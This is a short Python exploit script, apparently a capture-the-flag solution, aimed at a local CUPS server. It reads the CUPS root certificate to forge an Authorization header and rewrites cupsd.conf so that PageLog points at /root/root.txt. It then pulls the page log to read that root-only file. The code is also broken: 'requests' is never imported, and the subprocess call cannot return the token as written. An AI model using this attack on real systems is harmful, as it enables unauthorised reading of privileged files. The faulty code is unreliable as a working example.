#!/bin/env python

import subprocess

auth_token=subprocess.run(["cat /var/run/cups/certs/0"], check=True)
auth = 'Authorization: Local %s' % auth_token

cookies = {
    'org.cups.sid': '',
}

headers = {
    'Authorization': auth,
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = 'OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0APageLog /root/root.txt'

response = requests.post('http://localhost:631/admin/', cookies=cookies, headers=headers, data=data)

print(response)

response2 = requests.get('http://localhost:631/admin/log/page_log', headers=headers)

print(response2)

print(auth)
